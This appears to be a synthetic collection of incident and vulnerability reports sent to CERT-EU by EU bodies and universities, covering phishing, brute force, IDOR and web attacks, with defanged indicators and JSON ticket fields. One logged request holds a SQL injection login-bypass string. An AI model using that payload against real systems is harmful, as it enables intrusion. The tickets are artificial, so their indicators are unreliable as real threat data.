escalation or DPO notification is warranted at this stage.

I am a procurement officer in the Ministry of Economic Affairs, NL, and while assisting a vendor with a document upload, I noticed some odd behaviour in the file submission process that may expose sensitive data to unauthorised users. I'm not a technical expert, so apologies if my explanation isn't fully precise, but I hope this is the right place to flag this.\n\nHere's what happened: I uploaded a draft contract PDF through the 'Supplier Documents' section, but when I refreshed the page, a different file\u2014a document I had uploaded months ago, related to a totally different procurement procedure\u2014appeared in the list alongside the new upload. I double-checked by logging in with a test vendor account (I have one for demo purposes) and could see the same old file listed under recent submissions, even though it was from my official account. My concern is that files are being cross-listed between different user sessions or accounts, potentially exposing confidential bid documents to other users or organisations.\n\nI asked a colleague from IT to take a look, and they suspect it could be something related to session handling or maybe the way the portal indexes uploads. They mentioned 'insecure direct object reference' as a possible cause (not sure exactly what that means). We didn't try to manipulate URLs or run any tests beyond normal usage, as we didn't want to break anything or go beyond our normal user permissions.\n\nI know the portal is widely used for sensitive and commercial information, so any document leakage would be a big deal for us and the suppliers we work with. I\u2019m attaching a couple of screenshots showing the mismatched files (I\u2019ve redacted any sensitive info) and have kept a record of the exact steps I took, if that helps. \n\nHappy to provide more details if you need them\u2014just let me know. Please also advise if there\u2019s a specific process for vendors or Member State staff to report issues like this directly to the platform administrators, or if it\u2019s best to go through CERT-EU.

This message is submitted under the Coordinated Vulnerability Disclosure (CVD) policy, following best practices as outlined in the EU\u2019s NIS2 Directive.\n\nSpecifically, we have discovered an insecure direct object reference (IDOR) flaw in the API endpoint at hxxps://brand-portal[.]europa.eu/api/v1/expansion/strategies. Through crafted requests, authenticated users can access and modify strategy documents belonging to other organizational units, bypassing intended access controls.

Early this morning (11 July 2024, ~04:22 CET), our SOC detected suspicious privilege escalation activity via our SIEM (Elastic Stack), followed by signs of lateral movement to integrated workflow modules.\n\nThe initial alert originated from a failed login attempt to a privileged service account ('svc_projadmin') from IP 92.60.184.51 (geolocated in CZ), immediately succeeded by a successful login from the same address. Within minutes, the account\u2019s permissions were modified, granting full administrative rights to an otherwise dormant user ('userX').

Some requests originated from previously unseen user agents, including 'python-requests/2.28.1', suggesting scripted automation. We are concerned that the attacker may have leveraged integration features to facilitate lateral movement or data exfiltration between project modules.\n\nImmediate containment steps included disabling the affected accounts, revoking all admin sessions, and isolating the integration API gateway. We have preserved all relevant logs (see attached 'pm-incident-logs-20240711.zip') and are currently conducting forensic analysis to assess potential data exposure. No evidence of mass data exfiltration has been confirmed at this stage, but investigation is ongoing.\n\nGiven the potential for GDPR-relevant data to have been accessed and the risk of further compromise, we request CERT-EU\u2019s urgent assistance with deep-dive forensics, recommendations for containment, and support with any necessary notifications under NIS2.

As discussed during last month\u2019s security review, we\u2019ve just completed the initial round of penetration testing against our new e-Resource Management Portal (erms.europarl.europa.eu) prior to its official launch scheduled for August. The pentest was carried out by our external partner, BlueShield Consulting, over the period 1\u20135 July, focusing on API endpoints and session handling within the staff and vendor modules.\n\nThe test report (attached as \u2018EP_ERMS_API_Pentest_20240705.pdf\u2019) details several medium and high-severity findings, but I wanted to flag a particular issue that could potentially affect production data integrity. Specifically, the testers discovered that the /api/vendor/invoice-upload endpoint accepts PDF uploads without proper file-type validation or antivirus scanning. They successfully uploaded a test file containing an EICAR signature, which was then accessible to staff users via the portal\u2019s document viewer. There was no alert from our current AV gateway (Trend Micro Deep Security), and the upload was processed as a normal invoice.\n\nIn addition, the pentesters noted that session tokens issued by the SSO module (v3.1.2, custom implementation) are not invalidated after password changes, allowing a previously authenticated session to persist even after credential rotation. This was reproducible in both Chrome and Firefox, and may pose a risk if an account is compromised.\n\nWe have already notified the vendor (AlpinaSoft) and are awaiting a patch for the file upload handler. In the meantime, we\u2019ve disabled invoice uploads for all external users as a precaution. Our devs are also reviewing the SSO code for token invalidation logic.

This message is to provide a progress update and flag two specific issues that have arisen during active testing.\n\nFirstly, our test users have reported intermittent failures with the multi-factor authentication (MFA) workflow, particularly when attempting to authenticate from non-EU IP addresses. The OTP delivery via SMS sometimes experiences delays exceeding 90 seconds, which disrupts the test flow and may not accurately reflect production conditions. Additionally, we noticed that repeated failed MFA attempts are not always triggering the expected account lockout after five consecutive failures, as outlined in our security policy. If you have encountered similar anomalies during your assessment, please advise whether these are reproducible on your end and if you require logs or test accounts to facilitate further investigation.\n\nSecondly, there appears to be inconsistent session invalidation upon logout. Specifically, after logging out and closing the browser, relaunching the session sometimes restores access without re-authentication, especially on Chrome v126.0.6478.54. We suspect this may be related to the recent SSO module upgrade (v2.7.4), but we would appreciate your input if your testing reveals session fixation or persistence vulnerabilities. If you have already identified any session management issues or related findings, please share preliminary details so our dev team can begin remediation planning.\n\nPlease also confirm whether your team requires any additional whitelisting for source IPs outside the 185.36.78.0/24 range, as our firewall logs indicate some blocked requests from test infrastructure not previously registered.\n\nWe are keen to ensure all critical authentication and session controls are thoroughly validated before the Secure Portal moves to production next quarter. If you anticipate any delays or require further coordination with our technical team, let me know so we can adjust timelines accordingly.\n\nBest regards,\n\nDr. Eva Petrescu\nLead Information Security Analyst\nDigital Security Section\nEuropean External Action Service (EEAS)", "created_date": "2025-03-20T00:00:00", "email_address": "eva.petrescu@eeas.europa.eu", "assigned_queue": "OFFSEC::Pentesting"}

Sorry for the cross-post if you\u2019ve already received this via MISP, but some details are new and worth flagging for your analysis.\n\nSummary: Over the past 72 hours, multiple Polish judiciary staff (mostly in regional courts) have reported targeted spear phishing attempts. The lures are disguised as urgent case notifications and exploit a recent legal ruling, using document templates that closely mimic internal Ministry of Justice comms. The emails contain links to hxxps://case-notify[.]pl and hxxps://eu-verdictfiles[.]org, both of which are newly registered (as of 29 May 2024) and hosted on VPS infrastructure in Lithuania. Several recipients clicked the links, leading to download of a ZIP archive (filename: verdict_update-PL2024.zip) containing a malicious macro-enabled Word doc (SHA256: 3d98f15e4a7c01bc39e64d5fd7bbf6f09e8d5f03a1b7e4e03a8e3d2e18a1bc23).\n\nCERT-PL analysis: The macros reach out to a C2 server at 185.136.207.55 using HTTP POST requests with custom headers (\"User-Agent: VerdictSync/2.1\"). Initial payloads attempt to enumerate system locale and running processes, then drop a second-stage loader (hash: 2b5d4d3e11c84f00f0d1e28f8a9fcbfe4e4f3a7e8b5f2a4c1a3c9d0e7b0c8a1e). This campaign shares some TTPs with previously reported \"VerdictNet\" phishing waves (see ATT&CK: T1566.001, T1204.002, T1059.005).\n\nWe\u2019re currently working with affected court IT teams to contain any further spread. No confirmed credential theft yet, but monitoring is ongoing. Attached is a STIX file with observed IOCs, and a short timeline of activity. Attribution is unclear, but there are hints of overlap with Eastern European actor clusters (low confidence, per CERT-PL).\n\nCould you please check for related infrastructure or campaign overlaps affecting other EU legal entities?

Both seem to be lightweight DLLs dropped by a process named \u201cinvcheck.exe\u201d (not a known binary in our environment). EDR (CrowdStrike) flagged the process for code injection attempts into the procurement client, but so far no lateral movement detected.\n\nWe\u2019re not sure if this is early-stage supply chain compromise or just a failed phishing attempt, but the infrastructure feels purpose-built. No staff have reported suspicious emails, and endpoint AV hasn\u2019t triggered.

This notification follows the identification of a potential web application attack targeting our primary Drupal-based public portal (host: web-cms01.comm.ec.europa.eu).\n\nIncident Timeline & Detection:\n- On 20/06/2024 at 18:25 CET, our SOC\u2019s SIEM (Elastic Stack) triggered multiple alerts for anomalous POST requests to /user/login and /admin routes from IP address 185.212.88.53.\n- The requests exhibited SQL injection signatures and attempted to exploit known vulnerabilities in Drupal core (CVE-2019-6340, CVE-2018-7600). See attached [waf_alerts_20240620.log] for full request samples.\n- Our WAF (Cloudflare) blocked most attempts, but logs indicate two suspicious successful admin login events shortly after, originating from the same source IP and user agent string (Mozilla/5.0 (compatible; DrupalScanner/1.0)).\n\nInvestigation & Impact:\n- Manual review of [auth.log] and Drupal event logs shows that a dormant admin account (user: comm_editor_archive) was accessed at 18:32 CET. This account was not in active use and should have been disabled as per our offboarding policy.\n- Subsequent to the login, several content modification actions and a new PHP file upload (filename: update_banner.php) were recorded. We have preserved forensic copies of the modified files and associated logs.\n- No immediate evidence of data exfiltration, but the presence of the uploaded PHP file raises concerns about possible web shell deployment or further privilege escalation.\n\nImmediate Actions Taken:\n- Disabled the compromised admin account and revoked all current sessions.\n- Isolated the affected web server from the production environment.\n- Initiated password resets for all privileged CMS users.\n- Notified DPO and started internal review under GDPR and NIS2 guidelines.\n\nAssistance Requested:\n- Requesting CERT-EU\u2019s support for deep-dive forensic analysis of the uploaded PHP file and related server activity.\n- Guidance on external notification obligations, should any personal data compromise be confirmed.\n- Recommendations for hardening Drupal configurations and monitoring for similar attack patterns across other DG COMM web assets.\n\nPlease find attached relevant log files and a preliminary incident timeline.

Over the last 72 hours, our SOC at the European Medicines Agency (EMA) has been picking up a spike in failed RDP login attempts against several externally exposed endpoints. The activity started late Friday and ramped up through the weekend, mostly targeting our regulatory document management servers (internal codename: OrionDocs).\n\nKey points:\n- Source IPs: Multiple, but a big chunk trace back to a new ASN (AS201919) registered out of Moldova. A few others are from what look like residential proxies in southern France and Portugal.\n- Username patterns: Noticed a focus on service accounts (e.g., docsync_svc, reg_admin) rather than typical user IDs. This is a shift from previous brute force activity we\u2019ve seen.\n- TTPs: Attempted logins come in bursts of 5-10 per minute, then long gaps\u2014maybe to avoid lockouts or blend in with legit traffic? No successful logins so far, but some attempts used passwords matching a recent credential dump we saw circulating on Telegram last week.\n\nWe ran the IPs and hashes through our MISP instance and found partial overlap with indicators from the \"SilverAtlas\" cluster (see ENISA TLP:AMBER bulletin from 2 July). Not sure if it\u2019s the same crew, but the targeting and timing seem to line up. We\u2019re attaching a CSV with all observed source IPs, plus log snippets showing failed attempts and associated timestamps. Also including the relevant MISP event export (TLP:GREEN) for your reference.\n\nWould appreciate any correlation with similar RDP brute force patterns across EU agencies\u2014especially if you\u2019ve seen SilverAtlas pivoting to document management platforms elsewhere.

Our team at DKCERT noticed a spike in outbound SMB connections from internal hosts to external IPs not previously seen in our threat landscape (see partial list below). This started last Friday evening and continued intermittently through the weekend, triggering alerts in our Zeek-based anomaly detection stack.

We\u2019re seeing a coordinated phishing campaign targeting regulatory staff in Germany and Austria, specifically those working on cross-border data compliance (see attached IOC_goldheron_20240628.json). This appears to be a new wave attributed to the \"GoldHeron\" cluster (low to medium confidence; see below for rationale).\n\nThe initial vector is a series of emails spoofing the European Data Governance Board, luring recipients to download a purported \"policy update\". The payload is a zipped VBS file (e.g., \"EU-Policy-Update-0628.zip\"), which drops a PowerShell loader (SHA256: 4e9c3d...1b2e5f) that reaches out to a fast-flux domain (hxxps://policy-sync[.]eu-updates[.]info). We\u2019ve observed the loader fingerprinting the host and then fetching a second-stage DLL, which gets injected into explorer.exe. EDR logs show the use of MITRE ATT&CK T1059.001 (PowerShell) and T1218.011 (Signed Binary Proxy Execution: Rundll32). The loader is obfuscated, but C2 comms are over HTTPS to a rotating set of IPs (mainly in the 37.120.200[.]0/24 range).\n\nWe\u2019ve included all observed indicators (domains, file hashes, email subjects, sender addresses) in the attached MISP JSON export (TLP:GREEN). For context, at least two endpoints in the Bundesnetzagentur were observed beaconing out within minutes of execution. No exfiltration yet, but the persistence mechanism leverages a scheduled task named \"PolicyUpdateMonitor\".\n\nOur current hypothesis is that this is related to the \"GoldHeron\" actor, based on infrastructure overlap with incidents from March 2024 (see BSI-CTI-2024-033), and similarities in PowerShell loader code structure. Attribution is still tentative\u2014if you have enrichment on the loader hash or C2 domains, or have seen similar TTPs in other EU agencies, please advise. Also, we\u2019d appreciate any info on recent \"GoldHeron\" targeting patterns or infrastructure shifts.\n\nApologies for the wall of text, running between meetings. Let me know if you need raw EDR telemetry or want to coordinate on takedown with our SOC.

I\u2019m the network admin for the European Court of Auditors (ECA), and we\u2019ve been running some routine checks on remote access due to increased telework this summer. \n\nHere\u2019s what we found: between 23:45 and 00:15, three different user accounts (eca-remote1, eca-finance2, and eca-ithelp) initiated VPN sessions from IPs geolocated in North Africa and Southeast Asia (notably 102.135.24.19 and 182.55.123.87).

Reviewing the logs, I noticed that the user agents for these sessions were all set to \u201cMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\u201d, which isn\u2019t the default for our corporate laptops.

We\u2019ve been working with your team on the scheduled external network penetration test, and I wanted to flag a couple of points from our side as the test enters its second week.\n\nFirst, we noticed a spike in IDS alerts from our perimeter Palo Alto firewalls starting late yesterday (around 17:30 CET), with several flagged attempts against the legacy Citrix Gateway (citrix-gw.audit.europa.eu). The alert signatures correspond to known credential stuffing and brute-force enumeration patterns, which matches the test plan you outlined last week.

Earlier this morning (around 10:15 CET), several colleagues (including myself) in the European Medicines Agency\u2019s HR section received an email claiming to be from our IT Helpdesk. The subject line was: \u201cImmediate Action Required \u2013 Password Reset Verification for EMA Staff Portal.\u201d\n\nSender appears as \"IT Support <support@ema-security-update[.]eu>\" (domain is definitely not our usual ema.europa.eu or IT vendor addresses).

The link (defanged here: hxxps://ema-staffportal[.]eu/secure-reset) supposedly leads to our internal portal but is unfamiliar and not listed in our documentation.\n\nThe tone is quite urgent: \u201cFailure to verify within 2 hours will result in temporary suspension of your access to HR services.\u201d It also references GDPR compliance, which is odd for a routine password reset. There\u2019s a generic IT Helpdesk signature, but no contact number or internal references, and the formatting is inconsistent (font sizes jump around, some text is bold for no reason).\n\nA few things that stood out to me:\n- The message was sent to about 15 staff at once (visible in To: field), not the usual IT process for password resets.\n- The link asks for username, password, and\u2014unusually\u2014date of birth and home address (which we never use for IT verification).\n- There\u2019s a minor typo in the opening line (\u201cDear EMA sttaff,\u201d), and the closing line uses UK spelling, which is not typical for our communications.\n\nNo one has clicked the link as far as I know, but I\u2019ve told the team to ignore it for now. I\u2019ve attached screenshots of the email and raw headers (sorry for the messy formatting, I exported from Outlook web).

During an internal review prompted by abnormal access patterns, we discovered a misconfiguration in the access control lists (ACLs) of our primary Azure Blob Storage containers used for campaign media assets. Specifically, certain containers (notably \"campaign-2024-assets\" and \"user-segmentation-data\") were inadvertently set to allow public read access.\n\nDespite immediate efforts to restrict permissions and audit access logs, we observed multiple unauthorized download attempts from non-EU IP addresses between 8 and 10 June 2024. While we have since corrected the ACLs and rotated access tokens, there remains concern that sensitive segmentation datasets\u2014including pseudonymized user profiles and campaign performance reports\u2014may have been exposed.\n\nI have attached a summary report with timeline, relevant log excerpts, and a list of potentially exposed files (see: dg-grow_campaign_acl_review.pdf).

The issue was initially identified this morning (12 July 2024, ~07:30 CET) after multiple users reported persistent authentication failures and unexplained disconnections from our analytics dashboards (hosts: fin-agg01.ec.europa.eu, fin-agg02.ec.europa.eu).\n\nUpon review, our internal monitoring (via CrowdStrike Falcon and Elastic SIEM) flagged a sequence of failed login attempts for several privileged service accounts (e.g., 'svc_finance', 'svc_scanner') originating from an external IP (185.120.38.14, geolocated in RO) not previously seen in our environment. Notably, the attempts coincided with the rollout of a recent update to our data integration middleware (v4.5.2). Shortly thereafter, a successful login was observed for 'svc_scanner' from the same IP, followed by a burst of API calls extracting financial summary data outside of normal scheduled jobs.\n\nRelevant log excerpt ([auth.log]):\n2024-07-12 07:32:18 CET | FAILED LOGIN | user: svc_finance | src_ip: 185.120.38.14\n2024-07-12 07:34:02 CET | SUCCESSFUL LOGIN | user: svc_scanner | src_ip: 185.120.38.14\n2024-07-12 07:34:17 CET | API CALL | endpoint: /export/summary | user: svc_scanner\n\nWe have since disabled the affected accounts and revoked all active sessions. Initial investigation suggests the possibility of credential compromise, potentially linked to a vulnerability introduced by the recent middleware update.

I wanted to flag an issue that I came across earlier today while managing the European Labour Mobility Portal (labourmob.europa.eu). I\u2019m not an IT person, but I do have admin access to the site to help HR publish new opportunities. This morning, when I tried to upload a PDF for a new job listing, the system threw a weird error \u2013 something like \"file upload failed: unrecognised format\" \u2013 even though I was sure it was a regular PDF. Out of curiosity (and, honestly, a bit of frustration), I renamed the file to .php just to see what would happen. To my surprise, the upload went through, and I could see the file listed in the portal\u2019s uploads folder (public/uploads/2024/). \n\nI then noticed the link to the uploaded file was publicly accessible. Out of concern, I checked by pasting the .php file\u2019s URL into my browser, and it just displayed a blank page. I didn\u2019t try to do anything else, but I\u2019m worried this could let someone upload something malicious and run it on the server. There are other file types there too\u2014one user even has a .js file uploaded from a couple of weeks ago. I brought this up with our local IT, but they said it\u2019s probably a glitch and I should email you directly because of security procedures.\n\nThe upload tool is built into our staff dashboard (https://labourmob.europa.eu/admin/uploads). I\u2019m not sure what checks it does on file types, but it\u2019s letting through stuff that probably shouldn\u2019t be there. I haven\u2019t tested anything else\u2014didn\u2019t want to break anything or get into trouble!\n\nI don\u2019t know if this is serious or not, but it seems risky that anyone with admin access can upload files that might actually get executed. Please let me know if you need me to try anything else or provide more info. I attached screenshots showing the steps and the files I found in the upload folder.\n\nSorry if this isn\u2019t the right way to report this, but I\u2019d rather be safe than sorry.

Notably, we have identified anomalous network traffic from the affected nodes to external IPs associated with previously documented infrastructure used by the TA429 actor group (per ENISA and recent MISP feeds).

Over the last three days, our team at the University of Porto has seen a surge in SSH brute-force attempts targeting our HPC cluster login nodes (mostly login01.hpc.up.pt and login03.hpc.up.pt). Normally we get the typical scan traffic, but this time the source IPs are all from a narrow /22 in the 45.67.210.0/22 block, which is odd\u2014never seen those before in our logs.\n\nWe checked a few of the offending IPs (45.67.211.24, 45.67.212.89, 45.67.213.140) in AbuseIPDB and Shodan, but there\u2019s almost nothing recent\u2014just one or two generic tags, nothing about coordinated attacks. All attempts come in short, intense bursts (like 4000+ tries in 20 minutes), always with different username combos (e.g., research, slurm, analysis, and even some random first names). Password guesses look auto-generated, not from any common list we\u2019ve seen. Timestamps from our fail2ban logs show the attacks start at 02:13 UTC and stop exactly at 02:35 UTC every day, which feels pretty automated. We also noticed the same pattern on two other academic networks in the G\u00c9ANT NOC chat, so maybe this is part of something wider?\n\nI\u2019ve attached a CSV export of our logs (filtered for these IPs and SSH events, nothing else) and a quick summary below. There\u2019s no evidence of successful logins or privilege escalation so far, but the persistence and the new infrastructure are concerning. I\u2019ve also included a couple of fail2ban ban/unban events for context.\n\nQuick summary:\n- Target: login01.hpc.up.pt, login03.hpc.up.pt (University of Porto HPC cluster)\n- Source IPs: 45.67.210.0/22 (sample: 45.67.211.24, 45.67.212.89, 45.67.213.140)\n- Timeframe: 18-20 June 2024, 02:13\u201302:35 UTC daily\n- Usernames tried: research, slurm, analysis, user, maria, nuno, etc.\n- No successful access detected\n- Tools: fail2ban, manual log review, cross-check with G\u00c9ANT NOC contacts\n\nDo you have any CTI on this /22 block or have you seen this infrastructure in use elsewhere?

We\u2019ve encountered some odd activity in our air quality reporting database and I\u2019d appreciate your urgent input.\n\nTimeline/context: This started last Friday (05/07/2024) around 16:40 CET, when one of our DB admins (Maria Jensen) noticed a sudden spike in SELECT and COPY commands running against the \u2018aq_data_2024\u2019 schema on our main PostgreSQL cluster (db-aq01.eea.europa.eu). The queries originated from an internal service account (svc_report_gen), but the pattern was highly irregular \u2013 including after-hours activity and large data exports that don\u2019t match our scheduled jobs.\n\nSample from [postgresql.log]:\n2024-07-05 16:41:02 CET | user=svc_report_gen | host=10.15.34.9 | QUERY: COPY aq_data_2024 TO '/tmp/export_20240705.csv' DELIMITER ',' CSV HEADER;\n2024-07-05 17:12:18 CET | user=svc_report_gen | host=10.15.34.9 | QUERY: SELECT * FROM aq_data_2024 WHERE station_id IS NOT NULL;\n\nWhat\u2019s worrying is that the host IP (10.15.34.9) doesn\u2019t match any of our documented reporting servers. According to our asset inventory, that address is currently unassigned. We also saw several failed login attempts for \u2018svc_report_gen\u2019 from the same IP earlier that afternoon (see attached log snippet). No one on our team recognizes this activity, and the account in question should only be used by our scheduled ETL pipeline (which runs from a different subnet).\n\nWe\u2019ve already disabled the svc_report_gen account and restricted outbound traffic from db-aq01 as a precaution. So far, no signs of privilege escalation or changes to the database structure, but we\u2019re concerned about possible data exfiltration or insider threat. Our SIEM (LogPoint) didn\u2019t flag any other anomalies, but I\u2019ve attached the relevant logs for your review.\n\nImmediate questions:\n- Could this be an external actor leveraging compromised credentials, or an internal misconfiguration?\n- What additional forensic steps should we take to determine if data was actually exfiltrated?\n- Are there specific indicators of compromise we should be looking for in our PostgreSQL and network logs?\n\nPlease let us know if you need more artefacts or if you want to set up a call. This is the first time we\u2019ve seen this kind of access pattern, and we want to make sure we\u2019re not missing anything.\n\nThanks in advance for your help \u2013 apologies for the slightly messy logs, we\u2019re still collating everything.\n\nBest regards,\n\nLars Mikkelsen\nIT Operations Manager\nEuropean Environment Agency\nlars.mikkelsen@eea.europa.eu", "created_date": "2024-12-23T00:00:00", "email_address": "lars.mikkelsen@eea.europa.eu", "assigned_queue": "DFIR::incidents"}

This notification is submitted under the Coordinated Vulnerability Disclosure (CVD) policy, in accordance with the NIS2 Directive and our internal security incident protocols.\n\nEarlier today (8 July 2024), multiple critical tools\u2014specifically, ClickUp (cloud-based task management) and a managed PostgreSQL instance (hosted via a European vendor)\u2014became intermittently unavailable for approximately 90 minutes. Preliminary analysis ruled out common causes such as DDoS or routine hardware/network failures. However, our incident response team observed anomalous outbound traffic originating from the PostgreSQL server to several unlisted IP addresses associated with an open-source dependency (libTaskSync v4.2.0) used by both platforms.\n\nUpon further inspection, we identified that the affected library, integrated for automated data synchronization between ClickUp and the PostgreSQL backend, is vulnerable to remote code execution via deserialization of untrusted JSON payloads. The flaw can be triggered if a malicious actor submits a crafted payload to the synchronization webhook endpoint (hxxps://tasksync-backend[.]ec.europa.eu/api/v1/sync), leading to arbitrary command execution on the underlying host and potential lateral movement to adjacent cloud resources.\n\nWe have captured relevant server logs, network traces, and a sanitized PoC exploit demonstrating the vulnerability, which are available upon request (not attached here for operational security reasons). As of now, we have temporarily disabled the affected integration, revoked service tokens, and begun a wider audit of dependencies. No evidence of data exfiltration has been observed at this stage, but the possibility of lateral compromise cannot be excluded.\n\nGiven the integration\u2019s role in cross-departmental workflows and the critical nature of impacted data, we recommend urgent review and coordinated notification to other EU institutions or vendors using libTaskSync. We are prepared to collaborate on further validation, impact analysis, and public disclosure timelines as needed.

Over the past three weeks, we have been conducting a historical analysis of access logs and network telemetry associated with our research collaboration portal (based on the 'ScholarConnect' suite, v4.5.2), following anomalous behaviour reported by several project coordinators.\n\nDuring our review, we identified repeated outbound connections from the ScholarConnect backend servers to previously unknown IPs registered in the APNIC region (not seen in our threat feed subscriptions). Notably, the connections occurred during document upload events, and the destination endpoints matched infrastructure flagged in a recent TLP:GREEN advisory circulated via the Nordic Academic Security Exchange (NASE).\n\nInitial investigation of system logs uncovered several suspicious POST requests to hxxps://collab-sync[.]cloudsyncers[.]org/api/sync (defanged). This domain is not documented in our asset inventory nor in any legitimate vendor documentation. File hashes (SHA256) for two PDF files exfiltrated during these events are:\n- b1e09a8f7e1c488b3ad8c9d211a8e3eab77d95e4976a7d1b4acb2c2aee4d8ef9\n- 2e54f9d0b2394e14a7f4dbf0e2bc2e5e7c4a1b6df237bb0c59a6e6e97d87a5f1\n\nAnalysis with Intezer and VirusTotal yielded no existing matches or detections. The activity appears to align with MITRE ATT&CK T1195 (Supply Chain Compromise) and T1041 (Exfiltration Over C2 Channel), though attribution is still unclear. We are in the process of reaching out to ScholarConnect\u2019s vendor for further clarification and requesting internal code reviews for recent plugin updates.\n\nFor your awareness, the following IOCs are included in the attached CSV (TLP:AMBER):\n- 3 destination IPv4s (defanged, registered to AS13335)\n- 1 FQDN (as above)\n- Timestamped access logs (UTC)\n\nGiven the inter-institutional use of ScholarConnect across several EU-funded research consortia, we are concerned this may represent a wider supply chain compromise affecting other member universities. Could you please:\n- Advise on any related incidents involving ScholarConnect or similar academic platforms in the EU constituency\n- Provide enrichment or contextual intelligence on the observed IPs/domains\n- Recommend best practices for secure plugin management and monitoring in academic SaaS deployments\n\nIf additional forensic artefacts (full memory dumps or server images) would be beneficial, we can arrange secure transfer upon request.\n\nThank you for your ongoing support and coordination.\n\nBest regards,\n\nDr. Helena Lindstr\u00f6m\nSenior Information Security Analyst\nStockholm University IT Security Group\n\n--- End forwarded message ---", "created_date": "2024-04-22T00:00:00", "email_address": "helena.lindstrom@su.se", "assigned_queue": "CTI"}

I\u2019m part of the European Court of Auditors' IT department, and while conducting an internal audit tied to our annual risk review, I noticed something off with how access tokens are handled when third-party apps (like the new eSignDoc add-in) request delegated permissions.\n\nHere\u2019s what I observed:\n- When initiating an OAuth2 login from the eSignDoc add-in, the redirect_uri parameter is not consistently validated by the backend. I was able to substitute the registered redirect URL with a custom endpoint under my own test domain, and the server still issued a valid access token (I used Fiddler to intercept and replay requests).\n- This effectively means an attacker could trick a user into authenticating via a phishing site and capture their token, leading to unauthorized access to confidential documents and signing permissions.\n- I replicated the behavior with two separate test accounts\u2014no elevated privileges, just standard user profiles. It looks like the vulnerable flow is limited to integrations that request the \u2018documents.readwrite.all\u2019 scope, but I haven\u2019t tested every possible permutation.\n\nI\u2019ve attached a sanitized HAR capture and step-by-step reproduction notes, including request/response headers.

Apologies for the late message \u2013 it\u2019s been a hectic day with several internal escalations.\n\nWe noticed, starting this morning (around 07:40 CET), a significant spike in failed authentication attempts targeting our privileged admin accounts (the ones with the \u2018EMA-CoreAdmin\u2019 role) within the eu-west-2 region. Our Azure AD logs (screenshot attached, see \u2018FailedAuths_20240613.png\u2019) show that these logins originated from IP addresses previously whitelisted for your testing, namely 91.201.66.102 and 91.201.66.105. The login attempts appeared to use a password spray pattern with minor variations on older admin credentials\u2014some of which we thought had already been rotated per last month\u2019s credential policy update.\n\nThis activity triggered our internal alerting and led to a brief lockout of two admin accounts (ema-admin1@ema.europa.eu and legacyops@ema.europa.eu). While we understand these are likely test activities as part of your agreed scope (cloud privilege escalation and account brute-force scenarios), the sudden volume and the timing overlapped with a live IT audit, which complicated our incident response procedures. Several business units temporarily lost access to critical regulatory submission workflows, causing some concern at the management level. Our team had to pause all admin-level changes for about 35 minutes until we confirmed the source was within the test parameters.\n\nCould you please clarify if this round of password spraying was intentional, and if so, whether the specific test windows were meant to coincide with business hours? We\u2019d appreciate a heads-up before any further high-volume brute-force attempts on admin accounts\u2014especially as our annual regulatory audit continues through this week.

Worse, some legacy service accounts (svc_data_migr, svc_reportgen) appear to have write access to C$ on two Windows Server 2019 hosts.

While no ransomware deployment has been observed so far, the post-exploitation phase includes credential dumping via a custom PowerShell script (hash: b1f7a0c4e3c8d93e2f0d7d5e2b5b7c2e6f5a4b2e9d1c7a3f8b6c4e2d9a5b1f7a).\n\nWe are treating this as an ongoing investigation and have already notified the affected Italian CERT (CERT-AgID), but would appreciate any additional context from your side:\n- Have you observed recent \"Amber Glass\" exploit kit campaigns in other EU institutions or cross-border entities?\n- Are the attached IOCs or C2 domains correlated with recent high-profile exploitation attempts?\n- Any insight on mitigation steps or actor-specific detection rules is welcome, especially regarding the obfuscated JAR payloads (sample attached, TLP:AMBER).\n\nPlease let us know if you require further forensic artefacts or traffic captures.

The PDFs, when opened, prompted users to enable JavaScript (not standard for our org).

The script attempts to fingerprint the host (Win32_ComputerSystem queries, system locale) and then pulls a secondary payload from hxxps://update-edu[.]net/patch.bin (currently 404).

Starting late last night (11 July 2024, ~23:40 CET), we observed a significant and sustained spike in inbound HTTP/HTTPS requests, primarily targeting our login and search endpoints. Initial analysis via our SIEM (Splunk) and WAF logs indicates the traffic originated from a diverse set of external IPs, with a notable concentration from ASN 14061 and 20473 (see attached [waf_alerts.log], [access.log] extracts).\n\nWhile high traffic is not unusual during press releases, this pattern included:\n- Multiple bursts of POST requests with malformed payloads and randomized user agents (e.g., 'python-urllib/3.9', 'curl/7.79.1'),\n- Repeated failed authentication attempts against privileged accounts (notably 'editor_admin' and 'webmgr') from IPs such as 185.99.24.7 and 45.77.88.14,\n- Several instances of attempted SQL injection strings in query parameters (see sample below):\n\n[2024-07-11T23:42:17Z] IP: 185.99.24.7 | URI: /login | POST data: username=admin' OR '1'='1';-- | User-Agent: python-urllib/3.9\n\nDespite our efforts to clear caches and reset application servers, the abnormal traffic persists, and site performance remains degraded. We have temporarily enabled strict WAF rules and geo-blocking for non-EU traffic, but are concerned this may be a coordinated attack (possibly DDoS with an attempted credential stuffing or reconnaissance component).\n\nNo direct evidence of successful compromise has been identified yet, but we are escalating due to the targeting of privileged accounts and the sophistication of the request patterns. In line with NIS2 incident reporting obligations, we request your support in:\n- Conducting a forensic review of relevant logs and application traces (attachments provided),\n- Advising on further containment and monitoring steps,\n- Assessing the need for external notifications or law enforcement coordination if indicators of compromise are confirmed.\n\nPlease advise if you require additional log samples, packet captures, or memory dumps from affected web nodes.

As part of our scheduled web application security assessment (aligned with our annual NIS2 compliance cycle), we are actively testing the data integration interface between our custom audit management platform and the internal data warehouse cluster (running Cassandra 4.0).\n\nThe assessment plan, as previously agreed, includes evaluating the security of the RESTful API responsible for synchronizing audit records from our secure web portal to the Cassandra backend. However, since yesterday, we have been experiencing repeated failures in data synchronization\u2014manifesting as incomplete record transfers and unexplained 500-series errors. Our application logs (see attached: sync_error_logs_20240702.txt) indicate that certain API endpoints (notably hxxps://audit-sync[.]eca.europa.eu/api/v1/records) are intermittently unavailable or returning malformed responses during the test sessions.\n\nGiven that these disruptions coincided with the active phase of our penetration test, we are concerned about potential security misconfigurations, rate-limiting issues, or even residual test artifacts affecting production-like behavior. To ensure the integrity of both the test and the live environment, we kindly request:\n\n- Technical input on whether these synchronization anomalies could be an unintended consequence of the penetration testing activities (e.g., payload fuzzing, authentication bypass attempts, excessive parallel requests)\n- Recommendations for adjusting the test methodology or throttle limits to prevent operational impact\n- Guidance on any additional diagnostic artefacts (packet captures, application traces) you require for further analysis\n\nFor context, the test window remains open until 5 July, and all penetration test traffic is sourced from IP 203.0.113.45 as per the engagement protocol.

